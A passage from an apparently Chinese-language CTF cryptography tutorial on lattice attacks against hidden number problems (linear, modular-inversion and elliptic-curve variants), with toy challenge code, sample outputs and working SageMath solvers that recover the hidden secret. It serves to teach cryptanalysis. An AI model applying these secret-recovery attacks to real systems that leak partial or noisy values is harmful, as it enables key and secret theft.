p</span><br><span class="line"></span><br><span class="line">ma = rs</span><br><span class="line">res = cs</span><br><span class="line"></span><br><span class="line">W = matrix(ZZ, ma)</span><br><span class="line">cc = vector(ZZ, res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Babai&#x27;s Nearest Plane algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -=  M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">A1 = matrix.identity(column)</span><br><span class="line">Ap = matrix.identity(row) * prime</span><br><span class="line">B = block_matrix([[Ap], [W]])  </span><br><span class="line">lattice = IntegerLattice(B, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, res)</span><br><span class="line">re = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(re))</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(prime)</span><br><span class="line">M = Matrix(R, ma)</span><br><span class="line">M = M.transpose()</span><br><span class="line"></span><br><span class="line">ingredients = M.solve_right(re)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ingredients))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="hnp-问题">HNP 问题</h1>
<p>HNP 问题，即 Hidden Number Problem。</p>
<h2 id="lhnp线性隐藏数问题">LHNP(线性隐藏数问题)</h2>
<h3 id="原理-1">原理</h3>
<p>LHNP，即 <em>The Linear Hidden Number
Problem</em>，线性隐藏数问题。</p>
<p>定义是从形如 <span class="math display">\[
c_i=r_i\cdot x+e_i\pmod{p}
\]</span> 的一组方程组恢复 <span class="math inline">\(s\)</span>。</p>
<p>即 <span class="math display">\[
\begin{cases}
c_1=r_1\cdot x+e_1\\
c_2=r_2\cdot x+e_2\\
\ \ \ \ \ \ \vdots\\
c_n=r_t\cdot x+e_t\\
\end{cases}\pmod{p}
\]</span> 将单个方程可以转化为 <span class="math display">\[
e_i=c_i-r_i\cdot x+k_ip
\]</span> 我们可以构造出矩阵 <span class="math display">\[
M=\begin{bmatrix}
p\\
&amp; p\\
&amp; &amp; \ddots\\
&amp; &amp; &amp; p\\
-r_1 &amp; -r_2 &amp; \cdots &amp; -r_n &amp; K/p &amp;\\
c_1 &amp; c_2 &amp; \cdots &amp; c_n &amp; &amp; K
\end{bmatrix}
\]</span> 其中 <span class="math inline">\(K\)</span> 为 <span class="math inline">\(e_i\)</span> 的上界，<span class="math inline">\(k_i\)</span>
为常系数，用于占位便于格出最短向量，该矩阵满足 <span class="math display">\[
(k_1,k_2,\cdots,k_t,x,1)M=(e_1,e_2,\cdots,e_t,Kx/p,K)
\]</span> 其中 <span class="math inline">\((e_1,e_2,\cdots,e_t,Kx/p,K)\)</span>
可证在格中，那么我们进行 LLL 算法即可得到该向量，并且可以从中还原 <span class="math inline">\(x\)</span>。</p>
<h3 id="实例">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t = <span class="number">30</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">x = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> x &gt; p:</span><br><span class="line">    x = getPrime(<span class="number">512</span>)</span><br><span class="line">rs = []</span><br><span class="line">cs = []</span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    r = getPrime(<span class="number">512</span>)</span><br><span class="line">    s = getPrime(<span class="number">400</span>)</span><br><span class="line">    c = (r * x + s) % p</span><br><span class="line">    rs.append(r)</span><br><span class="line">    cs.append(c)</span><br><span class="line">    ss.append(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;rs = <span class="subst">&#123;rs&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;cs = <span class="subst">&#123;cs&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>从上面代码我们可以获取三十个方程满足 <span class="math display">\[
c_i=r_i\cdot x+s_i\pmod{p}
\]</span> 构造格后 LLL 算法即可得到 <span class="math inline">\(x\)</span>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = p</span><br><span class="line">rs = rs</span><br><span class="line">cs = cs</span><br><span class="line">t = <span class="built_in">len</span>(rs)</span><br><span class="line">kbits = <span class="number">400</span></span><br><span class="line">K = <span class="number">2</span> ** kbits</span><br><span class="line"></span><br><span class="line">P = identity_matrix(t) * p</span><br><span class="line">RC = matrix([[-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]]) * matrix([rs, cs])</span><br><span class="line">KP = matrix([[K / p, <span class="number">0</span>], [<span class="number">0</span>, K]])</span><br><span class="line">M = block_matrix([[P, <span class="number">0</span>], [RC, KP]], subdivide=<span class="literal">False</span>)</span><br><span class="line">shortest_vector = M.LLL()</span><br><span class="line">x = shortest_vector[<span class="number">1</span>, -<span class="number">2</span>] / K * p % p</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
<h2 id="mihnp模反隐藏数问题">MIHNP(模反隐藏数问题)</h2>
<h3 id="原理-2">原理</h3>
<p>MIHNP，即 <em>The Modular Inversion Hidden Number
Problem</em>，模反隐藏数问题。</p>
<p>针对的是形如 <span class="math display">\[
h_i=(s+t_i)^{-1}-e_i\pmod{p}
\]</span> 其中，<span class="math inline">\(e\)</span>
是误差（error），满足 <span class="math inline">\(|e|\leq
\frac{p}{2^{k+1}}\)</span>，从 <span class="math inline">\(d\)</span> 个
<span class="math inline">\((h_i,t_i)\)</span> 对中恢复 <span class="math inline">\(s\)</span> 即模反隐藏数问题。</p>
<p>考虑其中一个方程，有 <span class="math display">\[
(h_0+e_0)(s+t_0)\equiv 1\pmod{p}
\]</span> 那么可以改写成 <span class="math inline">\(s\)</span> 的表达式
<span class="math display">\[
s\equiv
\frac{1-(h_0+e_0)t_0}{h_0+e_0}\equiv\frac{1}{h_0+e_0}-t_0\pmod{p}
\]</span> 如果我们有另外一个对 <span class="math inline">\((h_1,t_1)\)</span>，那么可以写作 <span class="math display">\[
(h_1+e_1)(s+t_1)\equiv 1\pmod{p}
\]</span> 将 <span class="math inline">\(s\)</span> 改写为用 <span class="math inline">\((h_0,t_0)\)</span> 对表示 <span class="math display">\[
1\equiv (h_1+e_1)(\frac{1}{h_0+e_0}-t_0+t_1)\pmod{p}
\]</span> 展开可写成方程 <span class="math display">\[
(h_0+e_0)(h_1+e_1)(t_0-t_1)+(e_0-e_1)+(h_0-h_1)\equiv 0\pmod{p}
\]</span> 那么其中只有 <span class="math inline">\((e_0,e_1)\)</span>
对未知，我们仅需构造方程后进行二元 Coppersmith 还原这两个小根即可。</p>
<h3 id="实例-1">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;th1s_1s_fl4g&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = random.getrandbits(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt; mod =&#x27;</span>, p)</span><br><span class="line">secret = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XennyOracle</span>():</span><br><span class="line">    r = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = invert(secret+r, p) - getPrime(<span class="number">246</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt; r =&#x27;</span>, r)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt; d =&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        op = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">            XennyOracle()</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">            ss = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ss == secret:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    task()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error. try again.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>根据如上代码，可以得到关系式 <span class="math display">\[
d=\frac{1}{\mathrm{secret}+r}-e\pmod{p}
\]</span> 其中我们需要两对 <span class="math inline">\((d,r)\)</span>。</p>
<blockquote>
<p>mod =
103749960487318496535753127992597646596574197997346604494391500263407540367515232654243412375033616945349248057185120615722859917113041268644784351010497818179758334399774566693302975715253680868349322945783661543444012109390796753316368646224473385493551959776211868508124173853146220498072369988662598365737</p>
<p>r =
7554447571265160138826769036234163274945140724778979915009852024745364483862510066425251491305987868229626094117437547971483604358422085703908125935180533</p>
<p>d =
101985344200009891162621238301457902327130889519486305921303529965809795092552155000675574294868973653091733390024027051635945224775240336861956431150596823874553394527629780608016246850565741640968516986406244424459268316383289944793625444505084150632372055950924768521047738331629715715251235824065754062421</p>
<p>r =
13090253437847914840731392679465737677743543688720968701737801038380918192995977693627043510294249352189923663339210839369051093420312059888494671044789773</p>
<p>d =
67171614284124458946714888283433754454833311156850027624019964385885510153022868877446836813353331293804301964862035632895563688487758460098403813402145815716073796080437726175478667720783792797395845065060542295820029322704256388851730482630855413455182090758448749461531342234199684253932837821327563402710</p>
</blockquote>
<p>构造二元方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mod = <span class="number">103749960487318496535753127992597646596574197997346604494391500263407540367515232654243412375033616945349248057185120615722859917113041268644784351010497818179758334399774566693302975715253680868349322945783661543444012109390796753316368646224473385493551959776211868508124173853146220498072369988662598365737</span></span><br><span class="line">r1 = <span class="number">7554447571265160138826769036234163274945140724778979915009852024745364483862510066425251491305987868229626094117437547971483604358422085703908125935180533</span></span><br><span class="line">d1 = <span class="number">101985344200009891162621238301457902327130889519486305921303529965809795092552155000675574294868973653091733390024027051635945224775240336861956431150596823874553394527629780608016246850565741640968516986406244424459268316383289944793625444505084150632372055950924768521047738331629715715251235824065754062421</span></span><br><span class="line">r2 = <span class="number">13090253437847914840731392679465737677743543688720968701737801038380918192995977693627043510294249352189923663339210839369051093420312059888494671044789773</span></span><br><span class="line">d2 = <span class="number">67171614284124458946714888283433754454833311156850027624019964385885510153022868877446836813353331293804301964862035632895563688487758460098403813402145815716073796080437726175478667720783792797395845065060542295820029322704256388851730482630855413455182090758448749461531342234199684253932837821327563402710</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">Fp.&lt;e1, e2&gt; = Zmod(mod)[]</span><br><span class="line">f = (d1 + e1) * (d2 + e2) * (r1 - r2) + e1 - e2 + d1 - d2</span><br><span class="line">roots = small_roots(f, (<span class="number">2</span> ** <span class="number">246</span>, <span class="number">2</span> ** <span class="number">246</span>))</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line">e1, e2 = roots[<span class="number">0</span>]</span><br><span class="line">s1 = inverse_mod(ZZ(d1 + e1), mod) - r1</span><br><span class="line">s2 = inverse_mod(ZZ(d2 + e2), mod) - r2</span><br><span class="line"><span class="built_in">print</span>(s1 == s2)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<blockquote>
<p>LLL done</p>
<p>[(110376508622719622460215737752126153337071479266224099409237079274751233023,
105599366105793964194530868572953367123126433936636879204012605915941896157)]</p>
<p>True</p>
<p>53379746320881385658533052144390270941298506554594791554301088574708911821601622941503571564466589181259916168325928415646767240609719266256878030902014359933013735963354498961369838802171449182939387573660896489128177385885182722953047765671114102309583476608373333611398704410882862602499435963602566386559</p>
</blockquote>
<h3 id="扩展">扩展</h3>
<p>我们由上述方程 <span class="math display">\[
(h_0+e_0)(h_1+e_1)(t_0-t_1)+(e_0-e_1)+(h_0-h_1)\equiv 0\pmod{p}
\]</span> 可以变形为 <span class="math display">\[
(t_0-t_1)e_0e_1+(h_1(t_0-t_1)+1)e_0+(h_0(t_0-t_1)-1)e_1+h_0h_1(t_0-t_1)+h_0-h_1=0\pmod{p}
\]</span> 即可以改写成一个关于 <span class="math inline">\(e_0,e_1\)</span> 的方程 <span class="math display">\[
F_i(X,Y)=A_iXY+B_iX+C_iY+D_j
\]</span> 满足 <span class="math inline">\(F_i(e_0,
e_i)=0\pmod{p}\)</span></p>
<p>其中系数一一对应为 <span class="math display">\[
A_i=t_0-t_i\\
B_i=h_i(t_0-t_i)+1\\
C_i=h_0(t_0-t_i)-1\\
D_i=h_0h_i(t_0-t_i)+h_0-h_i
\]</span></p>
<blockquote>
<p>这里是，对于任意 <span class="math inline">\((e_0,e_i)\)</span>
对均成立此方程。</p>
</blockquote>
<p>自然地，对于 <span class="math inline">\(d\)</span> 个 <span class="math inline">\((e_0,e_i)\)</span> 对，我们可以列出方程组 <span class="math display">\[
\boldsymbol{v}=(1,e_1,\cdots,e_d,e_0,e_0e_1,\cdots,e_0e_d,k_1,\cdots,k_d)\\
R=\begin{bmatrix}
D_1&amp;D_2&amp;\cdots&amp;D_d\\
C_1&amp;0&amp;\cdots&amp;0\\
0&amp;C_2&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;C_d\\
B_1&amp;B_2&amp;\cdots&amp;B_d\\
A_1&amp;0&amp;\cdots&amp;0\\
0&amp;A_2&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;A_d\\
\end{bmatrix}
,P=\begin{bmatrix}
p&amp;0&amp;\cdots&amp;0\\
0&amp;p&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;p
\end{bmatrix}\\
\boldsymbol{v}\begin{bmatrix}R\\P\end{bmatrix}=\boldsymbol{0}
\]</span> 为了解出方程中的 <span class="math inline">\((e_0,\cdots,e_d)\)</span>，不妨构造格 <span class="math display">\[
M=\begin{bmatrix}
E&amp;R\\
0&amp;P
\end{bmatrix}
\]</span> 其中 <span class="math display">\[
E=\begin{bmatrix}
1&amp;0&amp;\cdots&amp;0&amp;0&amp;\cdots&amp;0\\
0&amp;2^{-k}&amp;\cdots&amp;0&amp;0&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;2^{-k}&amp;0&amp;\cdots&amp;0\\
0&amp;0&amp;\cdots&amp;0&amp;2^{-2k}&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;0&amp;0&amp;\cdots&amp;2^{-2k}
\end{bmatrix}
\]</span> 其中，<span class="math inline">\(k\)</span> 是 <span class="math inline">\(e_i\)</span> 的位数</p>
<p>使得 <span class="math display">\[
\boldsymbol{v}M=(1,\frac{e_1}{2^{k}},\cdots,\frac{e_d}{2^{k}},\frac{e_0}{2^{k}},\frac{e_0e_1}{2^{2k}},\cdots,\frac{e_0e_d}{2^{2k}},0,\cdots,0)
\]</span> 这个解向量很小，可以证明在格内。</p>
<h3 id="实例-2">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;th1s_1s_fl4g&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = random.getrandbits(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt; mod =&#x27;</span>, p)</span><br><span class="line">secret = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XennyOracle</span>():</span><br><span class="line">    r = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = invert(secret+r, p) - getPrime(<span class="number">328</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt; r =&#x27;</span>, r)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt; d =&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        op = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">            XennyOracle()</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">            ss = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ss == secret:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    task()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error. try again.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们迭代十五次获取到 ds 和 rs。</p>
<p>还原 <span class="math inline">\(secret\)</span> 的代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = mod</span><br><span class="line">hs = ds</span><br><span class="line">ts = rs</span><br><span class="line">k = <span class="number">328</span></span><br><span class="line">d = <span class="built_in">len</span>(hs) - <span class="number">1</span></span><br><span class="line">Ai = []</span><br><span class="line">Bi = []</span><br><span class="line">Ci = []</span><br><span class="line">Di = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, d + <span class="number">1</span>):</span><br><span class="line">    Ai.append(ts[<span class="number">0</span>] - ts[i])</span><br><span class="line">    Bi.append(hs[i] * Ai[-<span class="number">1</span>] + <span class="number">1</span>)</span><br><span class="line">    Ci.append(hs[<span class="number">0</span>] * Ai[-<span class="number">1</span>] - <span class="number">1</span>)</span><br><span class="line">    Di.append(hs[<span class="number">0</span>] * hs[i] * Ai[-<span class="number">1</span>] + hs[<span class="number">0</span>] - hs[i])</span><br><span class="line">R = block_matrix([matrix(Di), diagonal_matrix(Ci), matrix(Bi), diagonal_matrix(Ai)], ncols=<span class="number">1</span>)</span><br><span class="line">P = diagonal_matrix(ZZ, [p] * d)</span><br><span class="line">E = block_diagonal_matrix([matrix([<span class="number">1</span>]), diagonal_matrix([<span class="number">2</span>^(-k)] * (d + <span class="number">1</span>)), diagonal_matrix([<span class="number">4</span>^(-k)] * d)])</span><br><span class="line">M = block_matrix([[E, R], [<span class="number">0</span>, P]])</span><br><span class="line">shortest_vector = M.LLL()[<span class="number">0</span>]</span><br><span class="line">es = shortest_vector[<span class="number">1</span>:d+<span class="number">2</span>] * <span class="number">2</span> ^ k</span><br><span class="line">es = <span class="built_in">list</span>(es[-<span class="number">1</span>:]) + <span class="built_in">list</span>(es[:-<span class="number">1</span>])</span><br><span class="line">s = inverse_mod(ZZ(hs[<span class="number">0</span>] + es[<span class="number">0</span>]), p) - ts[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
<h2 id="echnp椭圆曲线隐藏数问题">ECHNP(椭圆曲线隐藏数问题)</h2>
<h3 id="原理-3">原理</h3>
<p>ECC 加密中，公开对通常是 <span class="math inline">\((tG,P+tG)\)</span>，其中 <span class="math inline">\(tG\)</span> 是公钥，<span class="math inline">\(P+tG\)</span> 是密文。</p>
<p>如果说我们拥有一个预言机，我们可以选择公钥生成密文，即使密文出现一定的错误，我们也可以还原出明文
<span class="math inline">\(P_x\)</span>。</p>
<p>我们知道对任意的 <span class="math inline">\(t\)</span> 可以成立
<span class="math display">\[
O_{P,G}(t)=(P+tG)_x=\left(\frac{y_P-y_Q}{x_P-x_Q}\right)^2-x_P-x_Q-e_t\pmod{p}
\]</span> 其中，<span class="math inline">\(Q=tG\)</span>。</p>
<p>不妨令 <span class="math display">\[
h_t=(P+tG)_x
\]</span> 那么有 <span class="math display">\[
(h_t+e_t+x_P+x_Q)(x_P-x_Q)^2=(y_P-y_Q)^2=x_P^3+ax_P+b-2y_Py_Q+y_Q^2\pmod{p}
\]</span> 优先选择 <span class="math inline">\(t=0\)</span>，那么我们有
<span class="math display">\[
h_0=x_P-e_0
\]</span> 考虑 <span class="math inline">\(y_P\)</span>
是我们不需要的数据，将其化简得到 <span class="math display">\[
y_P=\frac{x_P^3+ax_P+b+y_Q^2-(h_0+e_0+x_P+x_Q)(x_P-x_Q)}{2y_Q}
\]</span> 不妨考虑共轭对 <span class="math inline">\((P+Q)_x,(P-Q)_x\)</span></p>
<p>令 <span class="math display">\[
s_{P+Q}=\frac{y_P-y_Q}{x_P-x_Q},s_{P-Q}=\frac{y_P-y_{-Q}}{x_P-x_{-Q}}
\]</span> 我们尝试消去 <span class="math inline">\(y_P\)</span>，有
<span class="math display">\[
\begin{align}
(P+Q)_x+(P-Q)_x&amp;=s_{P+Q}^2-x_P-x_Q+s_{P-Q}^2-x_P-x_Q\\
&amp;=2\left(\frac{x_Qx_P^2+(a+x_Q^2)x_P+ax_Q+2b}{(x_P-x_Q)^2}\right)
\end{align}
\]</span> 那么 <span class="math inline">\(h_i=(P+Q)_x-e_i\)</span>
和其共轭 <span class="math inline">\(h_{-i}=(P-Q)_x-e_{-i}\)</span>
可以构造 <span class="math inline">\(\tilde{h}_i=h_i+h_{-i}\)</span>，<span class="math inline">\(\tilde{e}_i=e_i+e_{-i}\)</span>，再加上 <span class="math inline">\(x_P=h_0+e_0\)</span>，我们可以得到 <span class="math display">\[
\tilde{h}_i+\tilde{e}_i=2\left(\frac{x_Q(h_0+e_0)^2+(a+x_Q^2)(h_0+e_0)+ax_Q+2b}{(h_0+e_0-x_Q)^2}\right)
\]</span> 我们再把分母上的 <span class="math inline">\((h_0+e_0-x_Q)^2\)</span>
左乘，化简，我们可以改写为一个关于 <span class="math inline">\(e_0,\tilde{e}_t\)</span> 的方程 <span class="math display">\[
\begin{align}
F_i(X,Y)&amp;=X^2Y+(\tilde{h}_i-2x_Q)X^2+2(h_0-x_Q)XY+2[\tilde{h}_i(h_0-x_Q)-2h_0x_Q-a-x_Q^2]X+(h_0-x_Q)^2Y+[\tilde{h}_i(h_0-x_Q)^2-2h_0^2x_Q-2(a+x_Q^2)h_0-2ax_Q-4b]\\
&amp;=X^2Y+A_iX^2+A_{0,i}XY+B_iX+B_{0,i}Y+C_i
\end{align}
\]</span> 满足 <span class="math inline">\(F_i(e_0,
\tilde{e}_i)=0\pmod{p},Q=iG\)</span></p>
<p>其中系数一一对应为 <span class="math display">\[
A_i=\tilde{h}_i-2x_Q\\
A_{0,i}=2(h_0-x_Q)\\
B_i=2[\tilde{h}_i(h_0-x_Q)-2h_0x_Q-a-x_Q^2]\\
B_{0,i}=(h_0-x_Q)^2\\
C_i=\tilde{h}_i(h_0-x_Q)^2-2h_0^2x_Q-2(a+x_Q^2)h_0-2ax_Q-4b
\]</span> 自然地，对于 <span class="math inline">\(d\)</span> 个 <span class="math inline">\((e_0,\tilde{e}_i)\)</span> 对，我们可以列出方程组
<span class="math display">\[
\boldsymbol{v}=(1,e_0,\tilde{e}_1,\cdots,\tilde{e}_d,e_0^2,e_0\tilde{e}_1,\cdots,e_0\tilde{e}_d,k_1,\cdots,k_d)\\
R=\begin{bmatrix}
-C_1&amp;-C_2&amp;\cdots&amp;-C_d\\
-B_1&amp;-B_2&amp;\cdots&amp;-B_d\\
-B_{0,1}&amp;0&amp;\cdots&amp;0\\
0&amp;-B_{0,2}&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;-B_{0,d}\\
-A_1&amp;-A_2&amp;\cdots&amp;-A_d\\
-A_{0,1}&amp;0&amp;\cdots&amp;0\\
0&amp;-A_{0,2}&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;-A_{0,d}\\
\end{bmatrix}
,P=\begin{bmatrix}
p&amp;0&amp;\cdots&amp;0\\
0&amp;p&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;p
\end{bmatrix}\\
\boldsymbol{v}\begin{bmatrix}R\\P\end{bmatrix}=\begin{bmatrix}e_0^2\tilde{e}_1,\cdots,e_0^2\tilde{e}_d\end{bmatrix}
\]</span> 为了解出方程中的 <span class="math inline">\((e_0,\cdots,e_d)\)</span>，不妨构造格 <span class="math display">\[
M=\begin{bmatrix}
E&amp;R\\
0&amp;P
\end{bmatrix}
\]</span> 其中 <span class="math display">\[
E=\begin{bmatrix}
2^{3k}&amp;0&amp;\cdots&amp;0&amp;0&amp;\cdots&amp;0\\
